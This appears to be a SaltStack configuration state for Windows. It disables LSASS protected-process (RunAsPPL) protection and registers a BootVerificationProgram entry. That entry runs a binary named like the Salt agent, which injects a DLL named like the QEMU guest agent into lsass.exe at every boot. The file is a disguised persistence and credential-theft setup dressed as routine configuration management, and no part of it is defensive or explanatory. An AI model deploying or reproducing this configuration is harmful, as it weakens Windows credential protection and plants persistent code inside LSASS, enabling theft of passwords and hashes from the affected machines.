disable_lsass_ppl:
  reg.present:
    - name: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
    - vname: RunAsPPL
    - vdata: 0
    - vtype: REG_DWORD

boot_verification_persistence:
  reg.present:
    - name: HKLM\SYSTEM\CurrentControlSet\Control\BootVerificationProgram
    - vname: ImagePath
    - vdata: C:\Windows\Help\OEM\IndexStore\salt.exe -n lsass.exe -i C:\ProgramData\qemu-ga\qemu-ga.dll
    - vtype: REG_SZ
    - require:
      - reg: disable_lsass_ppl
